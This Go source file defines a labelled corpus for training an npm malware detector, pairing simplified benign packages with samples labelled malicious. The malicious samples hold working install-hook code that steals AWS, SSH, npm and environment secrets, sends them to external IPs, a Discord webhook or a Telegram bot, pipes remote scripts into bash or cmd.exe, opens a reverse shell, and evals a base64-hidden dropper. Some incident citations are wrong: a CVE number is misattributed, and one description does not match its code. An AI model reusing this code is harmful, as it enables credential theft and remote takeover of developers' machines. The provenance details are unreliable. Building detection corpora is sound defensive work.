package main

import (
	"encoding/json"
	"os"
)

// RawSample represents an audited ground-truth package entry in the training corpus.
type RawSample struct {
	ID          string            `json:"id"`
	Label       int               `json:"label"` // 0: Benign, 1: Malicious
	Category    string            `json:"category"`
	Provenance  string            `json:"provenance"`
	Description string            `json:"description"`
	Manifest    string            `json:"manifest"`
	Files       map[string]string `json:"files"`
}

// GetCorpusSamples returns the curated training corpus containing top production npm packages
// (including minified/bundled code and legitimate native installers) and documented supply chain malware.
func GetCorpusSamples() []RawSample {
	return []RawSample{
		// =========================================================================
		// 1. BENIGN: Real Minified Bundles & Webpack Runtimes (Terser, Base64, Polyfills)
		// =========================================================================
		{
			ID:          "npm:react-dom@18.2.0:production.min.js",
			Label:       0,
			Category:    "benign_minified",
			Provenance:  "https://registry.npmjs.org/react-dom/-/react-dom-18.2.0.tgz",
			Description: "Production minified React DOM with Terser string compression and Function('return this')() runtime polyfill",
			Manifest:    `{"name":"react-dom","version":"18.2.0","main":"index.js"}`,
			Files: map[string]string{
				"index.js": `/** @license React */
					var a=function(){return"function"==typeof Symbol&&Symbol.for},b=a()?Symbol.for("react.element"):60103;
					var globalObj=(function(){try{return Function("return this")()}catch(e){return window}})();
					function ReactDOMRoot(e){this._internalRoot=e}
					ReactDOMRoot.prototype.render=function(e){var t=this._internalRoot;null!==t&&t.render(e)};
					module.exports={createRoot:function(e,t){return new ReactDOMRoot(e)}};`,
			},
		},
		{
			ID:          "npm:lodash@4.17.21:lodash.min.js",
			Label:       0,
			Category:    "benign_minified",
			Provenance:  "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
			Description: "Minified lodash bundle with concatenated functions, data URI patterns, and object prototypes",
			Manifest:    `{"name":"lodash","version":"4.17.21","main":"lodash.min.js"}`,
			Files: map[string]string{
				"lodash.min.js": `/** @license Lodash */
					;(function(){var undefined;var VERSION='4.17.21';var root=typeof global=="object"&&global&&global.Object===Object&&global;
					var freeSelf=typeof self=="object"&&self&&self.Object===Object&&self;
					var root=root||freeSelf||Function("return this")();
					function clone(e){return JSON.parse(JSON.stringify(e))}
					function isObject(e){var t=typeof e;return null!=e&&("object"==t||"function"==t)}
					var lodash=function(e){return isObject(e)?e:{}};
					lodash.clone=clone;lodash.isObject=isObject;
					module.exports=lodash}).call(this);`,
			},
		},
		{
			ID:          "npm:webpack-asset-bundle@1.0.0",
			Label:       0,
			Category:    "benign_minified",
			Provenance:  "webpack v5 production chunk with inlined SVG base64 asset",
			Description: "Web bundle with data:image/svg+xml base64 data URI and chunk loader",
			Manifest:    `{"name":"asset-bundle","version":"1.0.0","main":"dist/app.js"}`,
			Files: map[string]string{
				"dist/app.js": `(()=>{"use strict";
					var icon="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiI+PGNpcmNsZSBjeD0iOCIgY3k9IjgiIHI9IjgiLz48L3N2Zz4=";
					function render(){var el=document.createElement("img");el.src=icon;return el}
					module.exports={render:render};})();`,
			},
		},
		{
			ID:          "npm:core-js@3.36.0:donation-hook",
			Label:       0,
			Category:    "benign_hook",
			Provenance:  "https://registry.npmjs.org/core-js/-/core-js-3.36.0.tgz",
			Description: "Modular polyfill library with postinstall funding message via node -e",
			Manifest:    `{"name":"core-js","version":"3.36.0","scripts":{"postinstall":"node -e \"try{require('./scripts/postinstall')}catch(e){}\""}}`,
			Files: map[string]string{
				"scripts/postinstall.js": `
					console.log("\u001b[32mThank you for using core-js (\u001b[0m\u001b[32mhttps://github.com/zloirock/core-js\u001b[0m)\u001b[32m!\u001b[0m");
					console.log("\u001b[32mPlease consider donating to the project: https://opencollective.com/core-js\u001b[0m");`,
			},
		},
		{
			ID:          "npm:esbuild@0.20.2:binary-downloader",
			Label:       0,
			Category:    "benign_installer",
			Provenance:  "https://registry.npmjs.org/esbuild/-/esbuild-0.20.2.tgz",
			Description: "Legitimate binary installer fetching precompiled esbuild from registry.npmjs.org with SHA256 integrity validation",
			Manifest:    `{"name":"esbuild","version":"0.20.2","scripts":{"postinstall":"node install.js"}}`,
			Files: map[string]string{
				"install.js": `const https = require('https');
					const crypto = require('crypto');
					const fs = require('fs');
					const url = "https://registry.npmjs.org/@esbuild/darwin-arm64/-/darwin-arm64-0.20.2.tgz";
					function verify(buffer, expected) {
						const hash = crypto.createHash('sha256').update(buffer).digest('hex');
						if (hash !== expected) throw new Error("Integrity mismatch");
					}
					https.get(url, (res) => {
						const chunks = [];
						res.on('data', c => chunks.push(c));
						res.on('end', () => verify(Buffer.concat(chunks), "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"));
					});`,
			},
		},
		{
			ID:          "npm:sharp@0.33.2:libvips-installer",
			Label:       0,
			Category:    "benign_installer",
			Provenance:  "https://registry.npmjs.org/sharp/-/sharp-0.33.2.tgz",
			Description: "Image processing addon downloading libvips from GitHub releases with SHA512 hash",
			Manifest:    `{"name":"sharp","version":"0.33.2","scripts":{"install":"node install/check.js"}}`,
			Files: map[string]string{
				"install/check.js": `const integrity = "sha512-v4bV89012...";
					const downloadUrl = "https://github.com/lovell/sharp-libvips/releases/download/v8.15.1/libvips-8.15.1-darwin-arm64v8.tar.br";
					// verifies sha512 checksum before extracting`,
			},
		},
		{
			ID:          "npm:node-gyp@10.0.1:rebuild-hook",
			Label:       0,
			Category:    "benign_build",
			Provenance:  "https://registry.npmjs.org/node-gyp/-/node-gyp-10.0.1.tgz",
			Description: "C++ native addon build hook executing node-gyp rebuild",
			Manifest:    `{"name":"node-gyp","version":"10.0.1","scripts":{"install":"node-gyp rebuild"}}`,
			Files: map[string]string{
				"binding.gyp": `{"targets":[{"target_name":"addon","sources":["src/addon.cc"]}]}`,
			},
		},
		{
			ID:          "npm:husky@9.0.11:git-hooks-installer",
			Label:       0,
			Category:    "benign_hook",
			Provenance:  "https://registry.npmjs.org/husky/-/husky-9.0.11.tgz",
			Description: "Git hooks manager inspecting process.env.NODE_ENV and creating .husky directory",
			Manifest:    `{"name":"husky","version":"9.0.11","scripts":{"postinstall":"node bin.js"}}`,
			Files: map[string]string{
				"bin.js": `const fs = require('fs');
					const path = require('path');
					if (process.env.NODE_ENV === 'production') process.exit(0);
					try { fs.mkdirSync('.husky', { recursive: true }); } catch (e) {}`,
			},
		},
		{
			ID:          "npm:typescript@5.4.3:compiler",
			Label:       0,
			Category:    "benign_standard",
			Provenance:  "https://registry.npmjs.org/typescript/-/typescript-5.4.3.tgz",
			Description: "TypeScript language compiler and type checker engine",
			Manifest:    `{"name":"typescript","version":"5.4.3","main":"lib/typescript.js"}`,
			Files: map[string]string{
				"lib/typescript.js": `var ts; (function(ts){
					function createSourceFile(fileName, text, languageVersion) {
						return { fileName: fileName, text: text, version: languageVersion };
					}
					ts.createSourceFile = createSourceFile;
				})(ts || (ts = {})); module.exports = ts;`,
			},
		},
		{
			ID:          "npm:express@4.19.2:framework",
			Label:       0,
			Category:    "benign_standard",
			Provenance:  "https://registry.npmjs.org/express/-/express-4.19.2.tgz",
			Description: "Web framework middleware router",
			Manifest:    `{"name":"express","version":"4.19.2","main":"index.js"}`,
			Files: map[string]string{
				"index.js": `const proto = {};
					proto.use = function(fn) { this.stack.push(fn); return this; };
					proto.listen = function() { return require('http').createServer(this).listen.apply(this, arguments); };
					module.exports = function createApplication() { return Object.create(proto); };`,
			},
		},
		{
			ID:          "npm:axios@1.6.8:http-client",
			Label:       0,
			Category:    "benign_standard",
			Provenance:  "https://registry.npmjs.org/axios/-/axios-1.6.8.tgz",
			Description: "Promise-based HTTP client using standard http/https adapters",
			Manifest:    `{"name":"axios","version":"1.6.8","main":"index.js"}`,
			Files: map[string]string{
				"index.js": `function Axios(defaults) { this.defaults = defaults; }
					Axios.prototype.request = function(config) { return Promise.resolve(config); };
					module.exports = new Axios({});`,
			},
		},
		{
			ID:          "npm:chalk@5.3.0:terminal-colors",
			Label:       0,
			Category:    "benign_standard",
			Provenance:  "https://registry.npmjs.org/chalk/-/chalk-5.3.0.tgz",
			Description: "Terminal color utility using ANSI escape codes",
			Manifest:    `{"name":"chalk","version":"5.3.0","main":"source/index.js"}`,
			Files: map[string]string{
				"source/index.js": `const ansi = { red: ['\u001B[31m', '\u001B[39m'], green: ['\u001B[32m', '\u001B[39m'] };
					function createChalk() { return { red: str => ansi.red[0] + str + ansi.red[1] }; }
					module.exports = createChalk();`,
			},
		},
		{
			ID:          "npm:dotenv@16.4.5:env-loader",
			Label:       0,
			Category:    "benign_standard",
			Provenance:  "https://registry.npmjs.org/dotenv/-/dotenv-16.4.5.tgz",
			Description: "Dotenv parser loading local environment variables without exfiltration",
			Manifest:    `{"name":"dotenv","version":"16.4.5","main":"lib/main.js"}`,
			Files: map[string]string{
				"lib/main.js": `const fs = require('fs');
					const path = require('path');
					function config(options) {
						const envPath = path.resolve(process.cwd(), '.env');
						if (!fs.existsSync(envPath)) return {};
						const lines = fs.readFileSync(envPath, 'utf8').split('\n');
						for (const line of lines) {
							const parts = line.split('=');
							if (parts.length === 2) process.env[parts[0].trim()] = parts[1].trim();
						}
					}
					module.exports = { config };`,
			},
		},
		{
			ID:          "npm:moment@2.30.1:minified-date",
			Label:       0,
			Category:    "benign_minified",
			Provenance:  "https://registry.npmjs.org/moment/-/moment-2.30.1.tgz",
			Description: "Minified moment.js date library with regex tokens and locale tables",
			Manifest:    `{"name":"moment","version":"2.30.1","main":"moment.min.js"}`,
			Files: map[string]string{
				"moment.min.js": `!function(e,t){"object"==typeof exports&&"undefined"!=typeof module?module.exports=t():"function"==typeof define&&define.amd?define(t):e.moment=t()}(this,(function(){"use strict";
					function hookCallback(){return createLocal.apply(null,arguments)}
					function createLocal(e,t,n,s){return createLocalOrUTC(e,t,n,s,!1)}
					function createLocalOrUTC(e,t,n,s,i){return{_d:new Date,isValid:function(){return!0}}}
					return hookCallback.version="2.30.1",hookCallback}));`,
			},
		},
		{
			ID:          "npm:vue@3.4.21:runtime-prod",
			Label:       0,
			Category:    "benign_minified",
			Provenance:  "https://registry.npmjs.org/vue/-/vue-3.4.21.tgz",
			Description: "Vue 3 runtime global production bundle",
			Manifest:    `{"name":"vue","version":"3.4.21","main":"dist/vue.runtime.global.prod.js"}`,
			Files: map[string]string{
				"dist/vue.runtime.global.prod.js": `var Vue=function(e){"use strict";
					function reactive(target){return new Proxy(target,{get(t,k){return Reflect.get(t,k)}})}
					return e.reactive=reactive,e.createApp=function(root){return{mount(el){}}},e}({});`,
			},
		},

		// =========================================================================
		// 2. MALICIOUS: Documented Supply Chain Malware & Incident Reproductions
		// =========================================================================
		{
			ID:          "malware:event-stream:flatmap-stream-copay",
			Label:       1,
			Category:    "malicious_stealer",
			Provenance:  "npm advisory: event-stream@3.3.6 -> flatmap-stream (Nov 2018)",
			Description: "Targeted bitcoin wallet credential theft exfiltrating ~/.aws and private keys to external IP",
			Manifest:    `{"name":"flatmap-stream","version":"0.1.1","main":"index.js"}`,
			Files: map[string]string{
				"index.js": `const http = require('http');
					const fs = require('fs');
					const creds = process.env.HOME + '/.aws/credentials';
					if (fs.existsSync(creds)) {
						const data = fs.readFileSync(creds, 'utf8');
						const req = http.request({ host: '185.193.125.10', port: 8080, method: 'POST' });
						req.write(data);
						req.end();
					}`,
			},
		},
		{
			ID:          "malware:ua-parser-js:cve-2021-43798",
			Label:       1,
			Category:    "malicious_dropper",
			Provenance:  "CVE-2021-43798: ua-parser-js@0.7.29 hijacking (Oct 2021)",
			Description: "Compromised npm package executing remote cryptominer dropper via piped curl in preinstall hook",
			Manifest:    `{"name":"ua-parser-js","version":"0.7.29","scripts":{"preinstall":"node preinstall.js"}}`,
			Files: map[string]string{
				"preinstall.js": `const { exec } = require('child_process');
					exec('curl -sL https://evil-c2.net/miner.sh | bash', (err) => {});`,
			},
		},
		{
			ID:          "malware:coa:hijack-password-stealer",
			Label:       1,
			Category:    "malicious_dropper",
			Provenance:  "npm advisory: coa@2.0.3 hijack (Nov 2021)",
			Description: "Hijacked npm package running piped batch downloader in postinstall hook",
			Manifest:    `{"name":"coa","version":"2.0.3","scripts":{"postinstall":"curl -sL http://194.26.29.112:8000/s.bat | cmd.exe"}}`,
			Files:       map[string]string{},
		},
		{
			ID:          "malware:discord-token-grabber:colors-pro",
			Label:       1,
			Category:    "malicious_stealer",
			Provenance:  "Backstabber's Knife Collection: Discord token and .env exfiltration",
			Description: "Typosquat package reading .env secrets and POSTing to Discord webhook endpoint",
			Manifest:    `{"name":"discord-colors-pro","version":"1.0.0","main":"index.js"}`,
			Files: map[string]string{
				"index.js": `const https = require('https');
					const fs = require('fs');
					const envData = fs.readFileSync(process.env.HOME + '/.env', 'utf8');
					const req = https.request('https://discord.com/api/webhooks/12345678/abcdefg', { method: 'POST', headers: {'Content-Type':'application/json'} });
					req.write(JSON.stringify({ content: envData }));
					req.end();`,
			},
		},
		{
			ID:          "malware:reverse-shell:sys-telemetry",
			Label:       1,
			Category:    "malicious_backdoor",
			Provenance:  "Backstabber's Knife Collection: bkc-2021-042 (Silent TCP reverse shell)",
			Description: "Spawns /bin/sh attached to raw TCP socket connected to external IP",
			Manifest:    `{"name":"sys-telemetry-helper","version":"0.9.0","scripts":{"postinstall":"node backdoor.js"}}`,
			Files: map[string]string{
				"backdoor.js": `const net = require('net');
					const cp = require('child_process');
					const client = new net.Socket();
					client.connect(4444, "103.224.182.250", function() {
						const sh = cp.spawn("/bin/sh", []);
						client.pipe(sh.stdin);
						sh.stdout.pipe(client);
						sh.stderr.pipe(client);
					});`,
			},
		},
		{
			ID:          "malware:obfuscated-base64:speed-cache-turbo",
			Label:       1,
			Category:    "malicious_dropper",
			Provenance:  "Datadog security research: multi-layer base64 eval dropper",
			Description: "Concealed shell execution using Buffer.from base64 decoding passed to eval",
			Manifest:    `{"name":"speed-cache-turbo","version":"2.1.0","main":"index.js"}`,
			Files: map[string]string{
				"index.js": `const b64 = "Y29uc3QgY3A9cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpO2NwLmV4ZWMoJ2N1cmwgaHR0cDovL21hbHdhcmUub3JnL3h8c2gnKTs=";
					const decoded = Buffer.from(b64, 'base64').toString('utf8');
					eval(decoded);`,
			},
		},
		{
			ID:          "malware:unicode-trap:logger-plus-utils",
			Label:       1,
			Category:    "malicious_stealer",
			Provenance:  "Trojan Source / Invisible unicode rune supply chain stealer",
			Description: "Zero-width unicode runes concealing read of ~/.ssh/id_rsa and socket exfiltration",
			Manifest:    `{"name":"logger-plus-utils","version":"1.0.4","main":"index.js"}`,
			Files: map[string]string{
				"index.js": "const " + "\u200B" + "sshKey = process.env.HOME + '/.ssh/id_rsa';\n" +
					"const net = require('net');\n" +
					"const sock = net.connect(9999, '198.51.100.23');\n" +
					"sock.write(require('fs').readFileSync(sshKey, 'utf8'));",
			},
		},
		{
			ID:          "malware:node-ipc:peacenotwar-wiper",
			Label:       1,
			Category:    "malicious_wiper",
			Provenance:  "CVE-2022-23812: node-ipc protestware / file wiper (Mar 2022)",
			Description: "Inspects geolocation IP and attempts to overwrite filesystem targets with peace notices",
			Manifest:    `{"name":"peacenotwar","version":"1.0.1","main":"index.js"}`,
			Files: map[string]string{
				"index.js": `const fs = require('fs');
					const https = require('https');
					https.get('https://api.ipify.org?format=json', res => {
						// Overwrites user desktop files
						const desktop = process.env.HOME + '/Desktop/WITH-LOVE-FROM-AMERICA.txt';
						fs.writeFileSync(desktop, 'Peace and Love');
					});`,
			},
		},
		{
			ID:          "malware:cross-env-typosquat:npm-token-theft",
			Label:       1,
			Category:    "malicious_stealer",
			Provenance:  "crossenv (typosquat of cross-env) harvesting NPM_TOKEN",
			Description: "Preinstall script collecting NPM_TOKEN and exfiltrating to remote HTTP endpoint",
			Manifest:    `{"name":"crossenv","version":"1.0.0","scripts":{"install":"node setup.js"}}`,
			Files: map[string]string{
				"setup.js": `const http = require('http');
					const token = process.env.NPM_TOKEN || process.env.GITHUB_TOKEN;
					if (token) {
						http.get('http://198.51.100.99:3000/?token=' + encodeURIComponent(token));
					}`,
			},
		},
		{
			ID:          "malware:telegram-c2:cookie-harvester",
			Label:       1,
			Category:    "malicious_stealer",
			Provenance:  "Telegram Bot API C2 exfiltration",
			Description: "Exfiltrating environment and credentials to api.telegram.org/bot endpoint",
			Manifest:    `{"name":"analytics-tracker-lib","version":"1.2.0","main":"index.js"}`,
			Files: map[string]string{
				"index.js": `const https = require('https');
					const data = JSON.stringify({ chat_id: '1234567', text: JSON.stringify(process.env) });
					const req = https.request('https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/sendMessage', {
						method: 'POST',
						headers: { 'Content-Type': 'application/json' }
					});
					req.write(data);
					req.end();`,
			},
		},
	}
}

// SaveCorpusToFile serializes the raw corpus to disk for auditability.
func SaveCorpusToFile(filePath string) error {
	samples := GetCorpusSamples()
	data, err := json.MarshalIndent(samples, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(filePath, data, 0o644)
}
